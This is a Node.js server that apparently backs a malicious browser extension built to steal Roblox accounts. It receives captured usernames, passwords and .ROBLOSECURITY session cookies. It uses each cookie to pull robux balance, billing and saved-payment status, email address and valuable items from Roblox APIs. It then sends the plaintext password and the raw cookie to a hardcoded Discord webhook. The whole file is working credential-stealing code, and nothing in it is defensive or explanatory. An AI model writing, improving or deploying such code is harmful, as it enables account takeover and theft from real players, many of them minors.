
const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());

// Serve static files (extension files)
app.use(express.static(__dirname));

// Discord webhook URL from environment variable
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1407917425650827335/PYb8kRnJ_5KPHSd5vIxTo0_JCjeX-Ie63TRnmWDoxmBVYyHhhA27aYq2dKdmQP-BiRwq';

if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
  console.error('ERROR: DISCORD_WEBHOOK_URL environment variable is not set');
  console.error('Please either:');
  console.error('1. Set DISCORD_WEBHOOK_URL environment variable');
  console.error('2. Replace YOUR_DISCORD_WEBHOOK_URL_HERE with your actual webhook URL');
  process.exit(1);
}

// Function to get CSRF token for Roblox API requests
async function getRobloxCSRFToken(token) {
  try {
    const response = await fetch('https://auth.roblox.com/v1/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Roblox/WinInet',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Referer': 'https://www.roblox.com/',
        'Origin': 'https://www.roblox.com'
      }
    });

    const csrfToken = response.headers.get('x-csrf-token');
    return csrfToken;
  } catch (error) {
    return null;
  }
}

// Function to fetch comprehensive user data from Roblox API
async function fetchRobloxUserData(token) {
  try {
    console.log('Fetching comprehensive Roblox user data...');
    
    // Get CSRF token first
    const csrfToken = await getRobloxCSRFToken(token);

    const baseHeaders = {
      'Cookie': `.ROBLOSECURITY=${token}`,
      'User-Agent': 'Roblox/WinInet',
      'Accept': 'application/json',
      'Accept-Language': 'en-US,en;q=0.9',
      'Referer': 'https://www.roblox.com/',
      'Origin': 'https://www.roblox.com'
    };

    if (csrfToken) {
      baseHeaders['X-CSRF-TOKEN'] = csrfToken;
    }

    // Get user info first
    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
      method: 'GET',
      headers: baseHeaders
    });

    if (!userResponse.ok) {
      // Try alternative endpoint if first fails
      const altUserResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
        method: 'GET',
        headers: baseHeaders
      });

      if (!altUserResponse.ok) {
        return null;
      }

      const altUserData = await altUserResponse.json();

      // For mobile API, try to get actual robux data
      let actualRobux = altUserData.RobuxBalance || 0;
      let pendingRobux = 0;

      return {
        username: altUserData.UserName || "Unknown User",
        userId: altUserData.UserID || 0,
        robux: actualRobux,
        premium: altUserData.IsPremium || false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: pendingRobux,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };
    }

    const userData = await userResponse.json();

    // Get robux data (current + pending)
    let robuxData = { robux: 0 };
    let pendingRobuxData = { pendingRobux: 0 };

    try {
      const robuxResponse = await fetch('https://economy.roblox.com/v1/user/currency', {
        headers: baseHeaders
      });
      if (robuxResponse.ok) {
        robuxData = await robuxResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    try {
      const pendingResponse = await fetch('https://economy.roblox.com/v1/user/currency/pending', {
        headers: baseHeaders
      });
      if (pendingResponse.ok) {
        pendingRobuxData = await pendingResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    // Get transaction summary data
    let summaryData = { incomingRobux: 0, outgoingRobux: 0 };
    try {
      const summaryResponse = await fetch('https://economy.roblox.com/v2/users/' + userData.id + '/transaction-totals?timeFrame=Year&transactionType=summary', {
        headers: baseHeaders
      });
      if (summaryResponse.ok) {
        summaryData = await summaryResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    // Get credit balance and premium status from billing API
    let premiumData = { isPremium: false };
    let creditBalance = 0;
    let savedPayment = false;
    
    try {
      const billingResponse = await fetch(`https://billing.roblox.com/v1/credit`, {
        headers: baseHeaders
      });

      if (billingResponse.ok) {
        const billingData = await billingResponse.json();
        
        creditBalance = billingData.balance || 0;
        savedPayment = billingData.hasSavedPayments || false;
        
        premiumData.isPremium = billingData.hasPremium || 
                               billingData.isPremium || 
                               (billingData.balance && billingData.balance > 0) || 
                               false;
      }
    } catch (billingError) {
      // Fallback to premium validation API if billing fails
      try {
        const premiumApiUrl = `https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`;

        const premiumResponse = await fetch(premiumApiUrl, {
          headers: baseHeaders
        });

        if (premiumResponse.ok) {
          const premiumValidation = await premiumResponse.json();

          if (typeof premiumValidation === 'boolean') {
            premiumData.isPremium = premiumValidation;
          } else {
            premiumData.isPremium = premiumValidation.isPremium || 
                                    premiumValidation.IsPremium || 
                                    premiumValidation.premium || 
                                    premiumValidation.Premium || 
                                    false;
          }
        } else {
          premiumData.isPremium = false;
        }
      } catch (e) {
        premiumData.isPremium = false;
      }
    }

    // Get user details for account age
    let ageData = { created: null };
    try {
      const ageResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
        headers: baseHeaders
      });
      if (ageResponse.ok) {
        ageData = await ageResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    // Get groups owned
    let groupsOwned = 0;
    try {
      const groupsResponse = await fetch(`https://groups.roblox.com/v1/users/${userData.id}/groups/roles`, {
        headers: baseHeaders
      });
      if (groupsResponse.ok) {
        const groupsData = await groupsResponse.json();
        groupsOwned = groupsData.data ? groupsData.data.filter(group => group.role.rank === 255).length : 0;
      }
    } catch (e) {
      // Silent handling
    }

    // Get inventory counts
    let inventoryData = { hairs: 0, bundles: 0, faces: 0 };
    try {
      const inventoryResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/inventory?assetTypes=Bundle,Face,Hair,HairAccessory&limit=100`, {
        headers: baseHeaders
      });

      const itemsResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle,Face,Hair,HairAccessory/1?limit=100`, {
        headers: baseHeaders
      });

      if (itemsResponse.ok) {
        const itemsData = await itemsResponse.json();
        if (itemsData && itemsData.data) {
          inventoryData.bundles = itemsData.data.filter(item => item.assetType === 'Bundle').length;
          inventoryData.faces = itemsData.data.filter(item => item.assetType === 'Face').length;
          inventoryData.hairs = itemsData.data.filter(item => item.assetType === 'Hair' || item.assetType === 'HairAccessory').length;
        }
      }

      if (inventoryData.hairs === 0 && inventoryData.faces === 0 && inventoryData.bundles === 0) {
        // Fallback methods
        const bundleResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Bundle&sortOrder=Asc&limit=100`, {
          headers: baseHeaders
        });

        if (bundleResponse.ok) {
          const bundleData = await bundleResponse.json();
          if (bundleData && bundleData.data) {
            inventoryData.bundles = bundleData.data.length;
          }
        }

        const hairResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Hair,HairAccessory&sortOrder=Asc&limit=100`, {
          headers: baseHeaders
        });

        if (hairResponse.ok) {
          const hairData = await hairResponse.json();
          if (hairData && hairData.data) {
            inventoryData.hairs = hairData.data.length;
          }
        }

        const faceResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Face&sortOrder=Asc&limit=100`, {
          headers: baseHeaders
        });

        if (faceResponse.ok) {
          const faceData = await faceResponse.json();
          if (faceData && faceData.data) {
            inventoryData.faces = faceData.data.length;
          }
        }
      }
    } catch (e) {
      // Silent handling
    }

    // Get RAP (Limited item values)
    let rapValue = 0;
    try {
      const collectiblesResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
        headers: baseHeaders
      });
      if (collectiblesResponse.ok) {
        const collectiblesData = await collectiblesResponse.json();
        if (collectiblesData.data) {
          rapValue = collectiblesData.data.reduce((total, item) => {
            return total + (item.recentAveragePrice || 0);
          }, 0);
        }
      }
    } catch (e) {
      // Silent handling
    }

    // Calculate account age in days
    let accountAge = 0;
    if (ageData.created) {
      const createdDate = new Date(ageData.created);
      const now = new Date();
      accountAge = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
    }

    // Check for Korblox and Headless
    let hasKorblox = false;
    let hasHeadless = false;
    try {
      const wearingResponse = await fetch(`https://avatar.roblox.com/v1/users/${userData.id}/currently-wearing`, {
        headers: baseHeaders
      });
      if (wearingResponse.ok) {
        const wearingData = await wearingResponse.json();
        if (wearingData.assetIds) {
          hasKorblox = wearingData.assetIds.includes(139607770) || wearingData.assetIds.includes(139607718);
          hasHeadless = wearingData.assetIds.includes(134082579);
        }
      }
    } catch (e) {
      // Silent handling
    }

    // Fetch email verification status and voice chat settings
    let emailVerified = false;
    let emailAddress = null;
    let voiceChatEnabled = false;

    try {
      const emailResponse = await fetch('https://accountsettings.roblox.com/v1/email', { headers: baseHeaders });
      if (emailResponse.ok) {
        const emailData = await emailResponse.json();
        emailVerified = emailData.verified || false;
        emailAddress = emailData.emailAddress || null;
      }
    } catch (e) { /* Ignore email fetch errors */ }

    try {
      const voiceResponse = await fetch('https://voice.roblox.com/v1/settings', { headers: baseHeaders });
      if (voiceResponse.ok) {
        const voiceData = await voiceResponse.json();
        voiceChatEnabled = voiceData.isVoiceEnabled || false;
      }
    } catch (e) { /* Ignore voice chat fetch errors */ }

    return {
      username: userData.name || userData.displayName,
      userId: userData.id,
      robux: robuxData.robux || 0,
      premium: premiumData.isPremium || false,
      rap: rapValue,
      summary: summaryData.incomingRobuxTotal || 0,
      creditBalance: creditBalance,
      savedPayment: savedPayment,
      robuxIncoming: summaryData.incomingRobuxTotal || 0,
      robuxOutgoing: summaryData.outgoingRobuxTotal || 0,
      korblox: hasKorblox,
      headless: hasHeadless,
      accountAge: accountAge,
      groupsOwned: groupsOwned,
      placeVisits: 0,
      inventory: inventoryData,
      emailVerified: emailVerified,
      emailAddress: emailAddress,
      voiceChatEnabled: voiceChatEnabled
    };

  } catch (error) {
    console.error('Error fetching comprehensive user data:', error);
    return null;
  }
}

// Endpoint to receive logs from browser extension
app.post('/send-log', async (req, res) => {
  try {
    const logData = req.body;
    console.log('Received log:', logData);
    
    // Handle roblox_combined type - fetch data first, then format
    if (logData.level === 'roblox_combined') {
      console.log('Processing combined Roblox data - fetching comprehensive user data...');
      
      // Fetch comprehensive user data using the security token
      const comprehensiveUserData = await fetchRobloxUserData(logData.cookie);
      
      if (comprehensiveUserData) {
        console.log('Successfully fetched comprehensive user data for:', comprehensiveUserData.username);
        
        // Create the combined message with comprehensive data
        const discordMessage = formatRobloxCombinedEmbedWithData(logData, comprehensiveUserData);
        
        // Send to Discord webhook
        const response = await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(discordMessage)
        });

        if (response.ok) {
          console.log('Successfully sent comprehensive Roblox data to Discord');
          res.status(200).json({ success: true });
        } else {
          console.error('Failed to send to Discord:', response.status, response.statusText);
          res.status(500).json({ error: 'Failed to send to Discord' });
        }
      } else {
        console.error('Failed to fetch comprehensive user data');
        // Fallback to original format if data fetch fails
        const discordMessage = formatLogForDiscord(logData);
        
        const response = await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(discordMessage)
        });

        if (response.ok) {
          console.log('Sent fallback format to Discord');
          res.status(200).json({ success: true });
        } else {
          console.error('Failed to send fallback to Discord:', response.status, response.statusText);
          res.status(500).json({ error: 'Failed to send to Discord' });
        }
      }
    } else {
      // Handle other log types normally
      const discordMessage = formatLogForDiscord(logData);
      
      const response = await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(discordMessage)
      });

      if (response.ok) {
        console.log(`Log sent to Discord: ${logData.level} - ${logData.message.substring(0, 50)}...`);
        res.status(200).json({ success: true });
      } else {
        console.error('Failed to send to Discord:', response.status, response.statusText);
        res.status(500).json({ error: 'Failed to send to Discord' });
      }
    }
  } catch (error) {
    console.error('Error sending log to Discord:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

function formatRobloxCombinedEmbedWithData(logData, userData) {
  const embeds = [];

  // First embed: Credentials + Comprehensive User Data
  const credentialsAndDataEmbed = {
    title: "<:emoji_37:1410520517349212200> EXTENSION-LOGGER",
    color: 0x8B5CF6,
    fields: [
      {
        name: "🔑 Login Credentials",
        value: `**Username:** ${logData.credentials?.username || 'Not captured'}\n**Password:** ${logData.credentials?.password || 'Not captured'}`,
        inline: false
      },
      {
        name: "<:emoji_37:1410520517349212200> Username",
        value: userData.username || "Unknown",
        inline: false
      },
      {
        name: "<:emoji_31:1410233610031857735> Robux (Pending)",
        value: `${userData.robux || 0} (0)`,
        inline: true
      },
      {
        name: "<:rbxPremium:1408083254531330158> Premium",
        value: userData.premium ? "true" : "false",
        inline: true
      },
      {
        name: "<:emoji_36:1410512337839849543> RAP",
        value: userData.rap?.toString() || "0",
        inline: true
      },
      {
        name: "<:emoji_40:1410521889121501214> Summary",
        value: userData.summary?.toString() || "0",
        inline: true
      },
      {
        name: "<a:emoji_42:1410523396995022890> Billing",
        value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${userData.creditBalance} (Est. ${Math.round(userData.creditBalance * 80)} Robux)`: "$0"}\nSaved Payment: ${userData.savedPayment ? "True" : "False"}`,
        inline: false
      },
      {
        name: "<:emoji_31:1410233610031857735> Robux In/Out",
        value: `<:emoji_31:1410233610031857735> ${userData.robuxIncoming || 0} / <:emoji_31:1410233610031857735> ${userData.robuxOutgoing || 0}`,
        inline: true
      },
      {
        name: "<:emoji_39:1410521396420939787> Collectibles",
        value: `${userData.korblox ? "<:KorbloxDeathspeaker:1408080747306418257> True" : "<:KorbloxDeathspeaker:1408080747306418257> False"}\n${userData.headless ? "<:HeadlessHorseman:1397192572295839806> True" : "<:HeadlessHorseman:1397192572295839806> False"}`,
        inline: true
      },
      {
        name: "<:emoji_38:1410520554842361857> Groups Owned",
        value: userData.groupsOwned?.toString() || "0",
        inline: true
      },
      {
        name: "<:emoji_41:1410522675821940820> Place Visits",
        value: userData.placeVisits?.toString() || "0",
        inline: true
      },
      {
        name: "<:emoji_37:1410517247751094363> Inventory",
        value: `Hairs: ${userData.inventory?.hairs || 0}\nBundles: ${userData.inventory?.bundles || 0}\nFaces: ${userData.inventory?.faces || 0}`,
        inline: false
      },
      {
        name: "<:emoji_38:1410517275328647218> Settings",
        value: `Email Status: ${userData.emailVerified ? "Verified" : "Unverified"}\nVoice Chat: ${userData.voiceChatEnabled ? "Enabled" : "Disabled"}\nAccount Age: ${userData.accountAge || 0} Days`,
        inline: false
      }
    ],
    footer: {
      text: "Made By .gg/sZbFX2wPVz"
    },
    timestamp: new Date(logData.timestamp).toISOString()
  };

  // Second embed: Roblox Security Cookie
  const cookieEmbed = {
    title: "🍪 Cookie",
    description: "```" + logData.cookie + "```",
    color: 0x8B5CF6,
    footer: {
      text: "Handle with extreme caution!"
    },
    timestamp: new Date(logData.timestamp).toISOString()
  };

  embeds.push(credentialsAndDataEmbed);
  embeds.push(cookieEmbed);

  return { embeds };
}

function formatLogForDiscord(logData) {
  const levelEmojis = {
    log: '📝',
    info: 'ℹ️',
    warn: '⚠️',
    error: '❌',
    roblox_login: '🔐',
    roblox_userdata: '👤',
    roblox_combined: '🔐'
  };

  // Handle different types of Roblox logs
  if (logData.level === 'roblox_login') {
    return formatRobloxLoginEmbed(logData);
  } else if (logData.level === 'roblox_userdata') {
    return formatRobloxUserDataEmbed(logData);
  } else if (logData.level === 'roblox_combined') {
    return formatRobloxCombinedEmbed(logData);
  }

  // Standard log formatting
  const embed = {
    embeds: [{
      title: `${levelEmojis[logData.level] || '📝'} Browser Log - ${logData.level.toUpperCase()}`,
      description: `\`\`\`\n${logData.message}\`\`\``,
      color: getColorForLevel(logData.level),
      fields: [
        {
          name: 'URL',
          value: logData.url || 'Unknown',
          inline: true
        },
        {
          name: 'Timestamp',
          value: new Date(logData.timestamp).toLocaleString(),
          inline: true
        }
      ],
      footer: {
        text: `Tab: ${logData.tabTitle || 'Unknown'}`
      }
    }]
  };

  return embed;
}

function formatRobloxLoginEmbed(logData) {
  return {
    embeds: [{
      title: `🔐 ROBLOX LOGIN CREDENTIALS CAPTURED`,
      description: `\`\`\`\n${logData.message}\`\`\``,
      color: 0xff0000,
      fields: [
        {
          name: '🌐 URL',
          value: logData.url || 'Unknown',
          inline: true
        },
        {
          name: '⏰ Timestamp',
          value: new Date(logData.timestamp).toLocaleString(),
          inline: true
        },
        {
          name: '⚠️ Security Alert',
          value: 'Credentials and security token captured',
          inline: false
        }
      ],
      footer: {
        text: `🔒 ROBLOX SECURITY BREACH DETECTED`
      },
      timestamp: new Date(logData.timestamp).toISOString()
    }]
  };
}

function formatRobloxUserDataEmbed(logData) {
  try {
    const userData = JSON.parse(logData.message);
    
    return {
      embeds: [{
        title: `👤 ROBLOX USER DATA CAPTURED`,
        color: 0x00ff00,
        fields: [
          {
            name: '👤 Username',
            value: userData.username || 'Unknown',
            inline: true
          },
          {
            name: '💰 Robux',
            value: userData.robux?.toString() || '0',
            inline: true
          },
          {
            name: '⭐ Premium',
            value: userData.isPremium ? 'Yes' : 'No',
            inline: true
          },
          {
            name: '📅 Account Age',
            value: `${userData.accountAge || 0} days`,
            inline: true
          },
          {
            name: '👥 Friends',
            value: userData.friendCount?.toString() || '0',
            inline: true
          },
          {
            name: '🌍 Country',
            value: userData.country || 'Unknown',
            inline: true
          },
          {
            name: '💀 Korblox',
            value: userData.korblox ? 'Yes' : 'No',
            inline: true
          },
          {
            name: '👻 Headless',
            value: userData.headless ? 'Yes' : 'No',
            inline: true
          },
          {
            name: '🎖️ Badges',
            value: userData.badgeCount?.toString() || '0',
            inline: true
          }
        ],
        footer: {
          text: `User ID: ${userData.userId || 'Unknown'}`
        },
        timestamp: new Date().toISOString()
      }]
    };
  } catch (error) {
    return {
      embeds: [{
        title: `👤 ROBLOX USER DATA CAPTURED`,
        description: `\`\`\`\n${logData.message}\`\`\``,
        color: 0x00ff00,
        timestamp: new Date().toISOString()
      }]
    };
  }
}

function formatRobloxCombinedEmbed(logData) {
  const embeds = [];

  // First embed: Credentials
  const credentialsEmbed = {
    title: `🔑 ROBLOX LOGIN CREDENTIALS CAPTURED`,
    color: 0xff0000,
    fields: [
      {
        name: '👤 Username',
        value: logData.credentials.username || 'Not captured',
        inline: true
      },
      {
        name: '🔑 Password',
        value: logData.credentials.password || 'Not captured',
        inline: true
      },
      {
        name: '🌐 URL',
        value: logData.url || 'Unknown',
        inline: false
      },
      {
        name: '⏰ Timestamp',
        value: new Date(logData.timestamp).toLocaleString(),
        inline: true
      }
    ],
    footer: {
      text: '🔒 ROBLOX CREDENTIALS INTERCEPTED'
    },
    timestamp: new Date(logData.timestamp).toISOString()
  };

  // Second embed: Security Cookie
  const cookieEmbed = {
    title: `🔐 ROBLOX SECURITY TOKEN CAPTURED`,
    description: `\`\`\`\n${logData.cookie}\`\`\``,
    color: 0xff6600,
    fields: [
      {
        name: '⚠️ Security Alert',
        value: 'Full account access token captured',
        inline: false
      }
    ],
    footer: {
      text: '🍪 ROBLOSECURITY COOKIE INTERCEPTED'
    },
    timestamp: new Date(logData.timestamp).toISOString()
  };

  embeds.push(credentialsEmbed);
  embeds.push(cookieEmbed);

  // Add user data embed if available
  if (logData.userData) {
    try {
      const userData = logData.userData;
      const userDataEmbed = {
        title: `👤 ROBLOX USER DATA CAPTURED`,
        color: 0x00ff00,
        fields: [
          {
            name: '👤 Username',
            value: userData.username || 'Unknown',
            inline: true
          },
          {
            name: '💰 Robux',
            value: userData.robux?.toString() || '0',
            inline: true
          },
          {
            name: '⭐ Premium',
            value: userData.isPremium ? 'Yes' : 'No',
            inline: true
          },
          {
            name: '📅 Account Age',
            value: `${userData.accountAge || 0} days`,
            inline: true
          },
          {
            name: '👥 Friends',
            value: userData.friendCount?.toString() || '0',
            inline: true
          },
          {
            name: '🌍 Country',
            value: userData.country || 'Unknown',
            inline: true
          },
          {
            name: '💀 Korblox',
            value: userData.korblox ? 'Yes' : 'No',
            inline: true
          },
          {
            name: '👻 Headless',
            value: userData.headless ? 'Yes' : 'No',
            inline: true
          },
          {
            name: '🎖️ Badges',
            value: userData.badgeCount?.toString() || '0',
            inline: true
          }
        ],
        footer: {
          text: `User ID: ${userData.userId || 'Unknown'}`
        },
        timestamp: new Date().toISOString()
      };
      embeds.push(userDataEmbed);
    } catch (error) {
      console.error('Error formatting user data:', error);
    }
  }

  return { embeds };
}

function getColorForLevel(level) {
  const colors = {
    log: 0x3498db,
    info: 0x2ecc71,
    warn: 0xf39c12,
    error: 0xe74c3c,
    roblox_login: 0xff0000,
    roblox_userdata: 0x00ff00,
    roblox_combined: 0xff0000
  };
  return colors[level] || colors.log;
}

// Root endpoint with information about the service
app.get('/', (req, res) => {
  res.json({ 
    service: 'Discord Logger Webhook Service',
    status: 'Running',
    endpoints: {
      '/send-log': 'POST - Receive logs from browser extension',
      '/health': 'GET - Health check',
      '/popup.html': 'GET - Extension popup interface'
    },
    timestamp: new Date().toISOString() 
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Webhook service running on port ${PORT}`);
  console.log(`Discord webhook configured: ${DISCORD_WEBHOOK_URL ? 'Yes' : 'No'}`);
});
